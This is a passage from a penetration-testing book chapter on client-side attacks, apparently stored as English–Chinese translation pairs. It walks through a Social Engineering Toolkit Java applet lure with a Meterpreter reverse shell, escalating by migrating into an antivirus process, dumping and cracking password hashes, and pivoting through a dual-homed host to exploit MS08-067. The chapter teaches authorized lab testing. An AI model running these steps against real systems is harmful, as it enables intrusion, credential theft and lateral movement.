- en: Chapter 12. Exploring Client-side Attack Vectors
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第12章。探索客户端攻击向量
- en: 'In this chapter, we will identify the methods we use to attack clients. Unlike
    our servers, the client does not provide services; therefore, it is not a simple
    task to get the client to wait for us to attack it. Instead, we will use techniques
    to get the client to come to us. In this chapter, we will discuss the following
    topics:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将确定我们用于攻击客户的方法。与我们的服务器不同，客户端不提供服务；因此，让客户端等待我们攻击它并不是一件简单的事情。相反，我们将使用技术让客户端前来。在本章中，我们将讨论以下主题：
- en: Client-side attack methods
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 客户端攻击方法
- en: Pilfering data from the client
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从客户端窃取数据
- en: Using the client as a pivot point
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用客户端作为枢纽点
- en: Client-side exploitation
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 客户端利用
- en: Binary payloads
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 二进制有效载荷
- en: Malicious PDF files
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 恶意PDF文件
- en: Bypassing antivirus and other protection tools
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 绕过防病毒软件和其他保护工具
- en: Obfuscation and encoding
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 混淆和编码
- en: This chapter will provide us with information about the ways we can target clients.
    We will explore the different methods of attacking a client. We will also explore
    how this is currently the main attack vector that we will present after the testing
    we do today. We have the advantage of knowing that the client is going to click
    on a link or a file in most cases. It is this action that will provide us with
    the vector to attack the client.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将为我们提供有关我们可以瞄准客户的方式的信息。我们将探讨不同的攻击客户的方法。我们还将探讨这是目前我们在今天进行的测试后将呈现的主要攻击向量。我们知道客户在大多数情况下都会点击链接或文件，这是我们攻击客户的矢量。
- en: Client-side attack methods
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 客户端攻击方法
- en: As we have already said, when it comes to a client, they do not just sit and
    wait for a connection from us; therefore, we have to trick them and get them to
    come to us. We have a number of ways to do this, and we will talk about two of
    them now.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们已经说过的，当涉及到客户端时，他们并不只是坐在那里等待我们的连接；因此，我们必须欺骗他们并让他们前来。我们有许多方法可以做到这一点，现在我们将讨论其中的两种。
- en: Bait
  id: totrans-13
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 诱饵
- en: When we deploy the bait technique, we set some form of bait and wait for a client
    to come and take the bait. This is a similar approach to fishing, that is, we
    try to put some type of bait out and entice a client to come to us. The problem
    with this approach is the same as the problem with fishing. We do not know whether
    the client will ever come to where we have the bait.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们部署诱饵技术时，我们设置某种诱饵，然后等待客户前来采取诱饵。这与钓鱼的方法类似，也就是说，我们试图放置某种诱饵并吸引客户前来。这种方法的问题与钓鱼的问题相同。我们不知道客户是否会来到我们设置诱饵的地方。
- en: Lure
  id: totrans-15
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 诱饵
- en: Using the lure concept, we are still trying to trick the client to come to us,
    but we don't just wait for them to come and take some form of bait. Instead, we
    send the client some form of communication and wait to see whether they are tricked
    into following our hook. We have three main methods in this scenario, and they
    are e-mail, web, and USB media. This is also the approach used in phishing and
    spear phishing. In each of these methods, we send an e-mail to a potential victim
    and see whether they will click on the link that we have sent them. If they do
    click on the link, we have them come to us or run an application on their systems
    and use that to mount our attack. Since we are working on our virtual pen testing
    environments, we can control the client side of the attack. So, it is a matter
    of experimenting on our range to see what works and what does not work. If we
    are allowed client-side testing in our scope of work, we can attempt to send phishing
    e-mails and other methods of social engineering to see whether we can trick an
    employee into falling in our trap.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 使用诱饵概念，我们仍在试图欺骗客户前来，但我们不只是等待他们前来并采取某种形式的诱饵。相反，我们向客户发送某种形式的通信，然后等待看看他们是否被诱骗跟随我们的钩子。在这种情况下，我们有三种主要方法，它们是电子邮件、网络和USB媒体。这也是网络钓鱼和鱼叉式网络钓鱼中使用的方法。在这些方法中，我们向潜在受害者发送电子邮件，然后看看他们是否会点击我们发送给他们的链接。如果他们确实点击了链接，我们就让他们来到我们这里或在他们的系统上运行一个应用程序，并利用这一点来发动我们的攻击。由于我们正在进行虚拟渗透测试环境的工作，我们可以控制攻击的客户端。因此，这是一个在我们的范围内进行实验，看看什么有效和什么无效的问题。如果我们被允许在我们的工作范围内进行客户端测试，我们可以尝试发送网络钓鱼邮件和其他社会工程学方法，看看我们是否能够欺骗员工陷入我们的陷阱。
- en: This is best shown with an example so we will do that now. We need the Kali
    Linux machine and a victim machine. For the example in this book, we will use
    a Windows 7 machine as the victim machine. The tool we will use is the Social
    Engineering Toolkit that was developed by Dave Kennedy; you can download it from
    [http://www.trustedsec.com](http://www.trustedsec.com). This is an exceptional
    tool that helps with client-side attacks. We will explore a Java attack vector
    for our first example.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 最好通过示例来展示这一点，因此我们现在将这样做。我们需要Kali Linux机器和一台受害者机器。在本书的示例中，我们将使用Windows 7机器作为受害者机器。我们将使用Dave
    Kennedy开发的社会工程工具包，您可以从[http://www.trustedsec.com](http://www.trustedsec.com)下载。这是一个出色的工具，有助于进行客户端攻击。我们将为我们的第一个示例探索Java攻击向量。
- en: 'Once the machines are up and running, we will open a terminal window and enter
    `setoolkit` to start the Social Engineering Toolkit. Accept the terms of service
    and enter `y` to move on to the next prompt. An example of the menu is shown in
    the following screenshot:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦机器启动并运行，我们将打开一个终端窗口并输入`setoolkit`来启动社会工程工具包。接受服务条款并输入`y`以继续下一个提示。菜单的示例如下屏幕截图所示：
- en: '![Lure](img/477-1_12_1.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_1.jpg)'
- en: 'The Social Engineering Toolkit has a number of menus that you have to work
    through, and we will do that now. We will use the **Social-Engineering Attacks**
    menu, so enter the number `1` as shown in the following screenshot:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 社会工程工具包有许多菜单需要您逐步操作，我们现在将这样做。我们将使用**社会工程攻击**菜单，因此输入数字`1`，如下面的屏幕截图所示：
- en: '![Lure](img/477-1_12_56.jpg)'
  id: totrans-21
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_56.jpg)'
- en: 'In the next window, select **Website Attack Vectors** by entering number `2`,
    as shown in the following screenshot:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一个窗口中，通过输入数字`2`选择**网站攻击向量**，如下面的屏幕截图所示：
- en: '![Lure](img/477-1_12_57.jpg)'
  id: totrans-23
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_57.jpg)'
- en: 'In the next window, select **Java Applet Attack Method** by entering number
    `1`, as shown in the following screenshot:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一个窗口中，通过输入数字`1`选择**Java Applet攻击方法**，如下截图所示：
- en: '![Lure](img/477-1_12_58.jpg)'
  id: totrans-25
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_58.jpg)'
- en: 'We will use a template, so enter number `1`. Enter `no` since we are not using
    port forwarding. Enter the IP address of the Kali machine for the connection back
    from the victim, as shown in the following screenshot:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用一个模板，因此输入数字`1`。输入`no`，因为我们不使用端口转发。输入Kali机器的IP地址以便受害者回连，如下截图所示：
- en: '![Lure](img/477-1_12_59.jpg)'
  id: totrans-27
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_59.jpg)'
- en: 'In the template options, enter number `1` to select **Java Required**, as shown
    in the following screenshot:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 在模板选项中，输入数字`1`选择**需要Java**，如下截图所示：
- en: '![Lure](img/477-1_12_60.jpg)'
  id: totrans-29
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_60.jpg)'
- en: 'We will enter option number `2` to select the Meterpreter reverse shell payload,
    as shown in the following screenshot:'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将输入选项号`2`选择Meterpreter反向shell载荷，如下截图所示：
- en: '![Lure](img/477-1_12_61.jpg)'
  id: totrans-31
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_61.jpg)'
- en: 'In the encoding option, select option number `4` for **Backdoored Executable**.
    Accept the default listener port of 443\. After a few moments, you should see
    a completion message. An example of this is shown in the following screenshot:'
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 在编码选项中，选择选项号`4`，选择**后门可执行文件**。接受默认的监听端口443。几秒钟后，您应该会看到一个完成消息。如下截图所示：
- en: '![Lure](img/477-1_12_62.jpg)'
  id: totrans-33
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_62.jpg)'
- en: 'Once the process is complete, the metasploit program will run and enter the
    configuration for the reverse shell. Once this process is complete, you should
    see a result similar to the following screenshot:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦进程完成，metasploit程序将运行并输入反向shell的配置。一旦这个过程完成，您应该会看到类似下面截图的结果：
- en: '![Lure](img/477-1_12_2.jpg)'
  id: totrans-35
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_2.jpg)'
- en: Screen displayed once the process is complete (the cropped text is not important)
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 进程完成后显示的屏幕（裁剪的文本不重要）
- en: 'As the previous screenshot shows, we now have the exploit running as a background
    job, so all we have to do is get the client to click on a link that references
    the IP address that we set up on the exploit. For our testing purposes, we will
    just open a browser on the Windows 7 machine and enter the IP address of the Kali
    machine. When you connect to the server with the browser, a dialog box pop-up
    referencing Java appears. An example of this is shown in the following screenshot:'
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们现在已经将利用作为后台任务运行，所以我们所要做的就是让客户端点击一个引用我们在利用中设置的IP地址的链接。为了我们的测试目的，我们将在Windows
    7机器上打开一个浏览器，并输入Kali机器的IP地址。当您用浏览器连接服务器时，会弹出一个引用Java的对话框。如下截图所示：
- en: '![Lure](img/477-1_12_3.jpg)'
  id: totrans-38
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_3.jpg)'
- en: 'Our intention here is to get the victim to click on the **Run** button, so
    we will do that now. As soon as we click on the button, another window may pop
    up. We should not have to click on it more than twice. When we return to our Kali
    machine, we should see a session open. An example of this is shown in the following
    screenshot:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的意图是让受害者点击**运行**按钮，所以我们现在要这样做。一旦我们点击按钮，可能会弹出另一个窗口。我们不应该不得不点击超过两次。当我们返回到Kali机器时，我们应该会看到一个会话打开。如下截图所示：
- en: '![Lure](img/477-1_12_4.jpg)'
  id: totrans-40
  prefs: []
  type: TYPE_IMG
  zh: '![诱饵](img/477-1_12_4.jpg)'
- en: We now have a session on the machine and it is just a matter of what we want
    to do from here. We will look at this next.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在在机器上有一个会话，接下来要做的就是我们想要从这里做什么。我们将在下面看到这一点。
- en: Pilfering data from the client
  id: totrans-42
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 从客户端窃取数据
- en: 'Once we have the shell of the machine, we will pilfer information from it.
    First, we will check what privilege level we are at. We want to be at the system
    privilege level so that we can access the data without problem. We need to interact
    with our shell, so press *Enter* in the Kali window and enter `sessions –i 1`
    to access the session. Once you are in the session, enter `getuid`. An example
    of this is shown in the following screenshot:'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们获得了机器的shell，我们将从中窃取信息。首先，我们将检查我们所处的权限级别。我们希望达到系统权限级别，这样我们就可以无障碍地访问数据。我们需要与我们的shell进行交互，因此在Kali窗口中按下*Enter*，然后输入`sessions
    –i 1`来访问会话。一旦进入会话，输入`getuid`。如下截图所示：
- en: '![Pilfering data from the client](img/477-1_12_5.jpg)'
  id: totrans-44
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_5.jpg)'
- en: 'As the previous screenshot shows, we are not at the system privilege level,
    so we want to fix that now. Enter `ps` to display the running processes on the
    victim machine. We will find a process that runs at the system privilege level.
    A sample of the victim machine of our example is shown in the following screenshot:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们没有达到系统权限级别，所以我们现在要解决这个问题。输入`ps`来显示受害机器上运行的进程。我们将找到一个以系统权限级别运行的进程。我们示例中的受害机器的样本如下截图所示：
- en: '![Pilfering data from the client](img/477-1_12_6.jpg)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_6.jpg)'
- en: 'As the previous screenshot shows, we have several processes to choose from.
    We will attempt to migrate the process `Mcshield.exe`. To do this, we enter `migrate
    1960` and wait to see whether our process is successful. If we are successful,
    then we move on and enter `getuid` again. If we are not successful, we try another
    process. It seems like a good process to hide in the on-demand antivirus scanner.
    An example of this is shown in the following screenshot:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们有几个进程可供选择。我们将尝试迁移`Mcshield.exe`进程。为此，我们输入`migrate 1960`并等待看我们的进程是否成功。如果成功，我们继续输入`getuid`。如果不成功，我们尝试另一个进程。看起来这是一个很好的进程，可以隐藏在按需杀毒扫描器中。如下截图所示：
- en: '![Pilfering data from the client](img/477-1_12_7.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_7.jpg)'
- en: As the previous screenshot shows, we have escalated privileges and officially
    own this system now. So, we have the freedom to pilfer information without needing
    a higher privilege level.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 正如前面的截图所示，我们已经提升了权限，现在正式拥有了这个系统。因此，我们有自由在不需要更高权限级别的情况下窃取信息。
- en: 'There are a number of tools in the Meterpreter shell that we can use to pilfer
    additional information. The first we will explore is the scraper tool. As the
    name suggests, we use this tool to scrape information from the exploited machine.
    An example of the tool being used is shown in the following screenshot:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 在Meterpreter shell中有许多工具可以用来窃取额外的信息。我们将首先探讨的是刮刀工具。顾名思义，我们使用这个工具从被 exploit 的机器中刮取信息。以下是使用该工具的示例截图：
- en: '![Pilfering data from the client](img/477-1_12_8.jpg)'
  id: totrans-51
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_8.jpg)'
- en: 'The scraper tool extracts a wealth of information from the compromised machine.
    This is why it takes quite a bit of time to extract the information and the tool
    to finish. The tool also extracts the password hashes from the machine. We can
    extract this information using the `hashdump` command. An example of this is shown
    in the following screenshot:'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 刮刀工具从被 compromise 的机器中提取了大量信息。这就是为什么提取信息和工具完成需要相当长的时间。该工具还从机器中提取密码哈希。我们可以使用`hashdump`命令提取此信息。以下是此过程的示例：
- en: '![Pilfering data from the client](img/477-1_12_9.jpg)'
  id: totrans-53
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_9.jpg)'
- en: 'We can save the hashes to a file, and then run them through the password cracking
    tool **John the Ripper** or any online site such as [http://www.md5decrypter.co.uk](http://www.md5decrypter.co.uk).
    Once we save the hashes to the file `hash.txt`, we open a terminal window and
    enter `john hash.txt --show`. This will start the password cracking process. An
    example of this is shown in the following screenshot:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以将哈希保存到文件中，然后通过密码破解工具**John the Ripper**或任何在线网站（如[http://www.md5decrypter.co.uk](http://www.md5decrypter.co.uk)）运行它们。一旦我们将哈希保存到文件`hash.txt`中，我们打开一个终端窗口并输入`john
    hash.txt --show`。这将启动密码破解过程。以下是此过程的示例：
- en: '![Pilfering data from the client](img/477-1_12_10.jpg)'
  id: totrans-55
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_10.jpg)'
- en: Screen showing the password cracking process (the cropped text is not important)
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 显示密码破解过程的屏幕（裁剪的文本不重要）
- en: 'We can also use the tool **winenum** to concentrate on the fact that the machine
    is a Windows machine. An example of this is shown in the following screenshot:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以使用工具**winenum**来集中注意事实，即机器是Windows机器。以下是一个示例：
- en: '![Pilfering data from the client](img/477-1_12_11.jpg)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_11.jpg)'
- en: 'All of this information is saved in the directory `/root/.msf4/logs/scripts`.
    Within this directory, you will see additional directories named for the tool
    that was used. An example of the files that are found after the winenum tool has
    been used is shown in the following screenshot:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 所有这些信息都保存在目录`/root/.msf4/logs/scripts`中。在这个目录中，您将看到以使用的工具命名的其他目录。使用winenum工具后找到的文件示例如下所示：
- en: '![Pilfering data from the client](img/477-1_12_12.jpg)'
  id: totrans-60
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_12.jpg)'
- en: 'As the previous screenshot shows, we have now pilfered a significant amount
    of information from the compromised machine. An example of the information pilfered
    from the `netstat__vb.txt` file is shown in the following screenshot:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的屏幕截图所示，我们现在已经从被 compromise 的机器中窃取了大量信息。以下是从`netstat__vb.txt`文件中窃取的信息的示例：
- en: '![Pilfering data from the client](img/477-1_12_13.jpg)'
  id: totrans-62
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_13.jpg)'
- en: 'In the previous screenshot, you can see the connections on the machine. This
    includes the two connections that are from our Kali machine. As you can see, we
    use the port 443\. There are several reasons for this. Some of them are: it will
    look like normal traffic in the network logs and that we will encrypt the information
    so that the monitoring on the machines is blind. An example of the session that
    we used is shown in the following screenshot:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的屏幕截图中，您可以看到机器上的连接。这包括来自我们Kali机器的两个连接。正如您所看到的，我们使用端口443。这样做有几个原因。其中一些原因是：它将看起来像网络日志中的正常流量，我们将加密信息，以便监视机器是盲目的。以下是我们使用的会话的示例：
- en: '![Pilfering data from the client](img/477-1_12_14.jpg)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![从客户端窃取数据](img/477-1_12_14.jpg)'
- en: The previous screenshot shows that while we pilfer the information, there is
    no indication of what we actually do. This makes it very difficult to determine
    what takes place within the session.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 前面的屏幕截图显示，当我们窃取信息时，并没有显示我们实际在做什么。这使得很难确定会话中发生了什么。
- en: Using the client as a pivot point
  id: totrans-66
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用客户端作为枢纽点
- en: When we compromise a machine, the next thing we want to do is use the client
    source to our advantage. This is because we know most networks are configured
    with the locations that are inside the network architecture being considered at
    a higher level of trust and not with a location that is outside the network. We
    refer to this as pivoting.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们 compromise 一台机器时，我们想要做的下一件事是利用客户端源。这是因为我们知道大多数网络都配置了网络架构内部位置被视为更高级别的信任，而不是网络外部的位置。我们称之为枢纽。
- en: Pivoting
  id: totrans-68
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 枢纽
- en: 'To set our potential pivot point, we first need to exploit a machine. Then
    we need to check for a second network card in the machine that is connected to
    another network, which we cannot reach without using the machine that we exploit.
    As an example in this book, we will use three machines with the Kali Linux machine
    as the attacker, a Windows XP machine as the first victim, and a Windows Server
    2003 machine the second victim. The scenario is that we get a client to go to
    our malicious site, and we use an exploit called *Use after free* against Microsoft
    Internet Explorer. This type of exploit has continued to plague the product for
    a number of revisions. An example of this is shown in the following screenshot
    from the Exploit DB website:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 要设置我们的潜在枢纽点，我们首先需要利用一台机器。然后我们需要检查机器中是否有第二个连接到另一个网络的网络卡，而我们无法在不使用我们利用的机器的情况下到达该网络。在本书的示例中，我们将使用三台机器，Kali
    Linux机器作为攻击者，Windows XP机器作为第一个受害者，Windows Server 2003机器作为第二个受害者。情景是我们让客户端访问我们的恶意网站，并使用一个名为*Use
    after free*的漏洞针对Microsoft Internet Explorer。这种类型的漏洞一直困扰着该产品的多个版本。以下是来自Exploit
    DB网站的示例截图：
- en: '![Pivoting](img/477-1_12_15.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_IMG
  zh: '![Pivoting](img/477-1_12_15.jpg)'
- en: The exploit listed at the top of the list is one that is against Internet Explorer
    9\. As an example in the book, we will target the exploit that is against Internet
    Explorer 8; the concept of the attack is the same. In simple terms, Internet Explorer
    developers continue to make the mistake of not cleaning up memory after it is
    allocated.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 列表中列出的漏洞是针对Internet Explorer 9的漏洞。在本书的示例中，我们将针对针对Internet Explorer 8的漏洞进行攻击；攻击的概念是相同的。简单来说，Internet
    Explorer开发人员继续犯一个错误，那就是在分配内存后没有清理内存。
- en: 'Start up your metasploit tool by entering `msfconsole`. Once the console has
    come up, enter `search cve-2013-1347` to search for the exploit. An example of
    the results of the search is shown in the following screenshot:'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 输入`msfconsole`启动您的metasploit工具。一旦控制台出现，输入`search cve-2013-1347`来搜索漏洞。搜索结果的示例如下截图所示：
- en: '![Pivoting](img/477-1_12_16.jpg)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![Pivoting](img/477-1_12_16.jpg)'
- en: One concern is that it is rated as good, but we like to find ratings of excellent
    or better when we select our exploits. For our purposes, we will see whether we
    can make it work. Of course, there is always a chance we will not find what we
    need and have to make the choice to either write our own exploit or document it
    and move on with the testing.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 一个担忧是它被评为良好，但我们喜欢在选择我们的漏洞时找到卓越或更好的评级。对于我们的目的，我们将看看是否可以让它工作。当然，总是有可能我们找不到我们需要的东西，不得不选择要么编写我们自己的漏洞，要么记录它并继续测试。
- en: 'For the example we use here in the book, the Kali machine is 192.168.177.170,
    and it is what we set our `LHOST` to. For your purposes, you will have to use
    the Kali address that you have. We will enter the following commands in the metasploit
    window:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 在这本书中我们使用的示例中，Kali机器的IP地址是192.168.177.170，这也是我们设置的`LHOST`。对于您的目的，您将不得不使用您拥有的Kali地址。我们将在metasploit窗口中输入以下命令：
- en: '[PRE0]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'An example of the results of the preceding command is shown in the following
    screenshot:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令的结果示例如下截图所示：
- en: '![Pivoting](img/477-1_12_17.jpg)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![Pivoting](img/477-1_12_17.jpg)'
- en: 'As the previous screenshot shows, we now have the URL that we need to get the
    user to access. For our purposes, we will just copy and paste it in Internet Explorer
    8, which is running on the Windows XP Service Pack 3 machine. Once we have pasted
    it, we may need to refresh the browser a couple of times to get the payload to
    work; however, in real life, we get just one chance, so select your exploits carefully
    so that one click by the victim does the intended work. Hence, to be a successful
    tester, a lot of practice and knowledge about the various exploits is of the utmost
    importance. An example of what you should see once the exploit is complete and
    your session is created is shown in the following screenshot:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们现在有了我们需要让用户访问的URL。对于我们的目的，我们将在运行Windows XP Service Pack 3的Internet
    Explorer 8中复制并粘贴它。一旦我们粘贴了它，我们可能需要刷新浏览器几次才能使有效载荷起作用；然而，在现实生活中，我们只有一次机会，所以要谨慎选择您的漏洞，以便受害者的一次点击能够产生预期的效果。因此，要成为一个成功的测试人员，对各种漏洞的实践和知识至关重要。一旦利用完成并创建了您的会话，您应该看到的内容示例如下截图所示：
- en: '![Pivoting](img/477-1_12_18.jpg)'
  id: totrans-80
  prefs: []
  type: TYPE_IMG
  zh: '![Pivoting](img/477-1_12_18.jpg)'
- en: Screen showing an example of what you should see once the exploit is complete
    and your session is created (the cropped text is not important)
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 显示一个示例，一旦利用完成并创建了您的会话，您应该看到的内容（裁剪的文本不重要）
- en: 'We now have a shell on the machine, and we want to check whether it is dual-homed.
    In the Meterpreter shell, enter `ipconfig` to see whether the machine you have
    exploited has a second network card. An example of the machine we exploited in
    the book is shown in the following screenshot:'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们在机器上有一个shell，并且我们想要检查它是否有双重主机。在Meterpreter shell中，输入`ipconfig`来查看您已经利用的机器是否有第二个网络卡。书中我们利用的机器示例如下截图所示：
- en: '![Pivoting](img/477-1_12_19.jpg)'
  id: totrans-83
  prefs: []
  type: TYPE_IMG
  zh: '![Pivoting](img/477-1_12_19.jpg)'
- en: 'As the previous screenshot shows, we are in luck. We have a second network
    card connected and another network for us to explore, so let us do that now. The
    first thing we have to do is set the shell up to route to our newly found network.
    This is another reason why we chose the Meterpreter shell, it provides us with
    the capability to set the route up. In the shell, enter `run autoroute –s 10.2.0.0/24`
    to set a route up to our 10 network. Once the command is complete, we will view
    our routing table and enter `run autoroute –p` to display the routing table. An
    example of this is shown in the following screenshot:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们很幸运。我们有第二个连接的网络卡和另一个网络供我们探索，所以现在让我们这样做。我们必须做的第一件事是设置shell以路由到我们新发现的网络。这也是我们选择Meterpreter
    shell的另一个原因，它为我们提供了设置路由的能力。在shell中，输入`run autoroute –s 10.2.0.0/24`来设置到我们10网络的路由。一旦命令完成，我们将查看我们的路由表，并输入`run
    autoroute –p`来显示路由表。这方面的示例如下截图所示：
- en: '![Pivoting](img/477-1_12_20.jpg)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![Pivoting](img/477-1_12_20.jpg)'
- en: 'As the previous screenshot shows, we now have a route to our 10 network via
    session 1\. So, now it is time to see what is on our 10 network. Next, we will
    add a background to our session 1; press the *Ctrl* + *z* to background the session.
    We will use the scan capability from within our metasploit tool. Enter the following
    commands:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，我们现在通过会话1有了到我们10网络的路由。所以，现在是时候看看我们的10网络上有什么了。接下来，我们将为我们的会话1添加一个后台；按下*Ctrl*
    + *z*将会话放到后台。我们将使用metasploit工具内的扫描功能。输入以下命令：
- en: '[PRE1]'
  id: totrans-87
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: The port scanner is not very efficient, and the scan will take some time to
    complete. You can elect to use the Nmap scanner directly in metasploit. Enter
    `nmap –sP 10.2.0.0/24`. Once you have identified the live systems, conduct the
    scanning methodology against the targets. For our example here, we have our target
    located at `10.2.0.149`.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 端口扫描器效率不高，扫描需要一些时间才能完成。您可以选择直接在metasploit中使用Nmap扫描器。输入`nmap –sP 10.2.0.0/24`。一旦确定了活动系统，对目标进行扫描方法。在我们的示例中，我们的目标位于`10.2.0.149`。
- en: 'An example of the results for this scan is shown in the following screenshot:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 这次扫描的结果示例如下截图所示：
- en: '![Pivoting](img/477-1_12_21.jpg)'
  id: totrans-90
  prefs: []
  type: TYPE_IMG
  zh: '![枢纽](img/477-1_12_21.jpg)'
- en: 'We now have a target, and we could use a number of methods we covered earlier
    against it. For our purposes here, we will see whether we can exploit the target
    using the famous MS08-067 Service Server buffer overflow. In the metasploit window,
    set the session in the background and enter the following commands:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有一个目标，我们可以使用我们之前介绍的多种方法来攻击它。在这里，我们将看看是否可以利用著名的MS08-067服务服务器缓冲区溢出攻击目标。在metasploit窗口中，将会话设置为后台，并输入以下命令：
- en: '[PRE2]'
  id: totrans-92
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'If all goes well, you should see a shell open on the machine. When it does,
    enter `ipconfig` to view the network configuration on the machine. From here,
    it is just a matter of carrying out the process that we followed before, and if
    you find another dual-homed machine, then you can make another pivot and continue.
    An example of the results is shown in the following screenshot:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一切顺利，您应该看到机器上打开了一个shell。当它打开时，输入`ipconfig`查看机器上的网络配置。从这里开始，只是执行我们之前遵循的过程，如果您找到另一台双主机机器，那么您可以进行另一个枢纽并继续。此结果的示例如下屏幕截图所示：
